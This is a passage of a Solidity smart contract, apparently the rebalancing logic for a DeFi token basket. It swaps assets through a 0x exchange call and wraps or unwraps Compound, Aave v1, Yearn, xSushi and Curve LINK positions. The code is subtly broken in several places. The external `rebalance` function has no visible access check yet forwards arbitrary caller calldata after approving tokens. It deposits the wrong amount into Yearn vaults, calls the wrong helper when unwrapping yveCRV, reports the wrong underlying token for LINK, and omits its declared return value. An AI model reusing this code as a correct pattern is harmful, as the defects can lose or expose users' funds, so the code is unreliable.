    address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address constant REN = 0x408e41876cCCDC0F92210600ef50372656052a38;
    address constant KNC = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
    address constant LRC = 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD;
    address constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address constant MTA = 0xa3BeD4E1c75D00fa6f4E5E6922DB7261B5E9AcD2;
    address constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;


    function rebalance(
        address _from,
        address _to,
        uint256 _amount,
        uint256 _minRecvAmount,
        bytes calldata _data
    ) external returns (uint256) {

        _requireAssetData(_from);

        bool hasTo = _hasAssetData(_to);
        require(hasTo || _to == ZRX, "!to");
        if (!hasTo) {
            assets.push(_to);
        }

        address fromUnderlying = _from;
        uint256 fromUnderlyingAmount = _amount;

        address toUnderlying = _getUnderlying(_to);

        if (_isCToken(_from)) {
            (fromUnderlying, fromUnderlyingAmount) = _fromCToken(_from, _amount);
        } else if (_isATokenV1(_from)) {
            (fromUnderlying, fromUnderlyingAmount) = _fromATokenV1(_from, _amount);
        } else if (_isYearnV2(_from)) {
            (fromUnderlying, fromUnderlyingAmount) = _fromYearnV2Vault(_from, _amount);
        } else if (_from == XSUSHI) {
            (fromUnderlying, fromUnderlyingAmount) = _fromXSushi(_amount);
        } else if (_from == yveCRV) {
            (fromUnderlying, fromUnderlyingAmount) = _toYveBoost(_amount);
        } else if (_from == linkCRV) {
            (fromUnderlying, fromUnderlyingAmount) = _fromLinkCRV(_amount);
        }

        IERC20(fromUnderlying).safeApprove(ZERO_X, 0);
        IERC20(fromUnderlying).safeApprove(ZERO_X, fromUnderlyingAmount);
        uint256 _before = IERC20(toUnderlying).balanceOf(address(this));
        (bool success, ) = ZERO_X.call(_data);
        require(success, "!swap");

        uint256 _after = IERC20(toUnderlying).balanceOf(address(this));
        uint256 _toAmount = _after.sub(_before);
        require(_toAmount >= _minRecvAmount, "!min-amount");

        if (_isCToken(_to)) {
            _toCToken(toUnderlying, _toAmount);
        } else if (_isATokenV1(_to)) {
            _toATokenV1(toUnderlying, _toAmount);
        } else if (_isYearnV2(_to)) {
            _toYearnV2Vault(_to, _amount);
        } else if (_to == yveCRV) {
            _toYveCRV(_toAmount);
        } else if (_to == linkCRV) {
            _toLinkCRV(_toAmount);
        } else if (_to == yvUNI) {}
    }

    function fromCUNI() external {
        _requireAssetData(CUNI);
        uint256 _balance = IERC20(CUNI).balanceOf(address(this));
        _fromCToken(CUNI, _balance);
        _overrideAssetData(CUNI, UNI);
    }

    function toYVUNI() external {
        _requireAssetData(UNI);
        uint256 _balance = IERC20(UNI).balanceOf(address(this));
        _toYearnV2Vault(yvUNI, _balance);
        _overrideAssetData(UNI, yvUNI);
    }

    function fromASNXv1() external {
        _requireAssetData(ASNXv1);
        uint256 _balance = IERC20(ASNXv1).balanceOf(address(this));
        _fromATokenV1(ASNXv1, _balance);
        _overrideAssetData(ASNXv1, SNX);
    }

    function toYVSNX() external {
        _requireAssetData(SNX);
        uint256 _balance = IERC20(SNX).balanceOf(address(this));
        _toYearnV2Vault(yvSNX, _balance);
        _overrideAssetData(SNX, yvSNX);
    }

    function fromAYFIv1() external {
        _requireAssetData(AYFIv1);
        uint256 _balance = IERC20(AYFIv1).balanceOf(address(this));
        _fromATokenV1(AYFIv1, _balance);
        _overrideAssetData(AYFIv1, YFI);
    }

    function toYVYFI() external {
        _requireAssetData(YFI);
        uint256 _balance = IERC20(YFI).balanceOf(address(this));
        _toYearnV2Vault(yvYFI, _balance);
        _overrideAssetData(YFI, yvYFI);
    }


    function _toCToken(address _token, uint256 _amount) internal returns (address, uint256) {
        address _ctoken = _getTokenToCToken(_token);
        uint256 _before = IERC20(_ctoken).balanceOf(address(this));

        IERC20(_token).safeApprove(_ctoken, 0);
        IERC20(_token).safeApprove(_ctoken, _amount);
        require(ICToken(_ctoken).mint(_amount) == 0, "!ctoken-mint");

        uint256 _after = IERC20(_ctoken).balanceOf(address(this));

        return (_ctoken, _after.sub(_before));
    }

    function _fromCToken(address _ctoken, uint256 _amount) internal returns (address, uint256) {
        address _token = ICToken(_ctoken).underlying();
        uint256 _before = IERC20(_token).balanceOf(address(this));
        require(ICToken(_ctoken).redeem(_amount) == 0, "!ctoken-redeem");
        uint256 _after = IERC20(_token).balanceOf(address(this));
        return (_token, _after.sub(_before));
    }

    function _toATokenV1(address _token, uint256 _amount) internal returns (address, uint256) {
        (, , , , , , , , , , , address _atoken, ) = ILendingPoolV1(LENDING_POOL_V1).getReserveData(_token);
        uint256 _before = IERC20(_atoken).balanceOf(address(this));
        IERC20(_token).safeApprove(LENDING_POOL_CORE_V1, 0);
        IERC20(_token).safeApprove(LENDING_POOL_CORE_V1, _amount);
        ILendingPoolV1(LENDING_POOL_V1).deposit(_token, _amount, 0);

        address feeRecipient = _readSlotAddress(FEE_RECIPIENT);
        require(feeRecipient != address(0), "!fee-recipient");

        if (feeRecipient != IATokenV1(_atoken).getInterestRedirectionAddress(address(this))) {
            IATokenV1(_atoken).redirectInterestStream(feeRecipient);
        }

        uint256 _after = IERC20(_atoken).balanceOf(address(this));

        return (_atoken, _after.sub(_before));
    }

    function _fromATokenV1(address _atoken, uint256 _amount) internal returns (address, uint256) {
        address _token = IATokenV1(_atoken).underlyingAssetAddress();
        uint256 _before = IERC20(_token).balanceOf(address(this));
        IATokenV1(_atoken).redeem(_amount);
        uint256 _after = IERC20(_token).balanceOf(address(this));
        return (_token, _after.sub(_before));
    }

    function _toXSushi(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = ISushiBar(XSUSHI).balanceOf(address(this));
        IERC20(SUSHI).safeApprove(XSUSHI, 0);
        IERC20(SUSHI).safeApprove(XSUSHI, _amount);
        ISushiBar(XSUSHI).enter(_amount);
        uint256 _after = ISushiBar(XSUSHI).balanceOf(address(this));
        return (XSUSHI, _after.sub(_before));
    }

    function _fromXSushi(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(SUSHI).balanceOf(address(this));
        ISushiBar(XSUSHI).leave(_amount);
        uint256 _after = IERC20(SUSHI).balanceOf(address(this));
        return (SUSHI, _after.sub(_before));
    }

    function _toLinkCRV(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(linkCRV).balanceOf(address(this));
        IERC20(LINK).safeApprove(CURVE_LINK, 0);
        IERC20(LINK).safeApprove(CURVE_LINK, _amount);
        ICurveLINK(CURVE_LINK).add_liquidity([_amount, uint256(0)], 0);
        uint256 _after = IERC20(linkCRV).balanceOf(address(this));
        return (linkCRV, _after.sub(_before));
    }

    function _toGaugeLinkCRV(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(gaugeLinkCRV).balanceOf(address(this));
        IERC20(linkCRV).safeApprove(gaugeLinkCRV, 0);
        IERC20(linkCRV).safeApprove(gaugeLinkCRV, _amount);
        ILinkGauge(gaugeLinkCRV).deposit(_amount);
        uint256 _after = IERC20(gaugeLinkCRV).balanceOf(address(this));
        return (gaugeLinkCRV, _after.sub(_before));
    }

    function _fromGaugeLinkCRV(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(linkCRV).balanceOf(address(this));
        ILinkGauge(gaugeLinkCRV).withdraw(_amount);
        uint256 _after = IERC20(linkCRV).balanceOf(address(this));
        return (linkCRV, _after.sub(_before));
    }

    function _fromLinkCRV(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(LINK).balanceOf(address(this));
        ICurveLINK(CURVE_LINK).remove_liquidity_one_coin(_amount, 0, 0);
        uint256 _after = IERC20(LINK).balanceOf(address(this));
        return (linkCRV, _after.sub(_before));
    }

    function _toYveCRV(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(yveCRV).balanceOf(address(this));
        IERC20(CRV).safeApprove(yveCRV, 0);
        IERC20(CRV).safeApprove(yveCRV, _amount);
        IveCurveVault(yveCRV).deposit(_amount);
        uint256 _after = IERC20(yveCRV).balanceOf(address(this));
        return (yveCRV, _after.sub(_before));
    }

    function _toYveBoost(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(yvBOOST).balanceOf(address(this));
        IERC20(yveCRV).safeApprove(yvBOOST, 0);
        IERC20(yveCRV).safeApprove(yvBOOST, _amount);
        IYearn(yvBOOST).deposit(_amount);
        uint256 _after = IERC20(yvBOOST).balanceOf(address(this));
        return (yvBOOST, _after.sub(_before));
    }

    function _fromYveBoost(uint256 _amount) internal returns (address, uint256) {
        uint256 _before = IERC20(yveCRV).balanceOf(address(this));
        IYearn(yvBOOST).withdraw(_amount);
        uint256 _after = IERC20(yveCRV).balanceOf(address(this));
        return (yveCRV, _after.sub(_before));
    }

    function _toYearnV2Vault(address _vault, uint256 _amount) internal returns (address, uint256) {
        address _underlying = IYearn(_vault).token();
        uint256 _before = IERC20(_vault).balanceOf(address(this));
        IERC20(_underlying).safeApprove(_vault, 0);
        IERC20(_underlying).safeApprove(_vault, _amount);
        IYearn(_vault).deposit(_amount);
        uint256 _after = IERC20(_vault).balanceOf(address(this));
        return (_vault, _after.sub(_before));
    }

    function _fromYearnV2Vault(address _vault, uint256 _amount) internal returns (address, uint256) {
        address _underlying = IYearn(_vault).token();
        uint256 _before = IERC20(_underlying).balanceOf(address(this));
        IYearn(_vault).withdraw(_amount);
        uint256 _after = IERC20(_underlying).balanceOf(address(this));
        return (_underlying, _after.sub(_before));
    }

    function _getTokenToCToken(address _token) internal pure returns (address) {
        if (_token == UNI) {
            return CUNI;
        }
        if (_token == COMP) {
            return CCOMP;
        }
        revert("!supported-token-to-ctoken");
    }

    function _getUnderlying(address _derivative) internal pure returns (address) {
        if (_derivative == CUNI) {
            return UNI;
        }

        if (_derivative == CCOMP) {
            return COMP;
        }

        if (_derivative == XSUSHI) {
            return SUSHI;
        }

        if (_derivative == AYFIv1) {
            return YFI;
        }

        if (_derivative == ASNXv1) {
            return SNX;
        }

        if (_derivative == AMKRv1) {
            return MKR;
        }

        if (_derivative == ARENv1) {
            return REN;
        }

        if (_derivative == AKNCv1) {
            return KNC;
        }

        if (_derivative == yveCRV || _derivative == yvBOOST) {
            return CRV;
        }

        if (_derivative == linkCRV) {
            return LINK;
        }

        return _derivative;
    }

    function _isCToken(address _token) internal pure returns (bool) {
        return (_token == CUNI || _token == CCOMP);
    }

    function _isATokenV1(address _token) internal pure returns (bool) {
        return (_token == AYFIv1 || _token == ASNXv1 || _token == AMKRv1 || _token == ARENv1 || _token == AKNCv1);
    }

    function _isYearnV2(address _token) internal pure returns (bool) {
        return (_token == yvYFI || _token == yvUNI || _token == yvSNX);
    }

    function _hasAssetData(address _from) internal view returns (bool) {
        for (uint256 i = 0; i < assets.length; i++) {
            if (assets[i] == _from) {
                return true;
            }
        }
        return false;
    }

    function _requireAssetData(address _from) internal view {
        require(_hasAssetData(_from), "!asset");
    }

    function _overrideAssetData(address _from, address _to) internal {
        for (uint256 i = 0; i < assets.length; i++) {
            if (assets[i] == _from) {
                assets[i] = _to;
                return;
            }
        }
    }
}
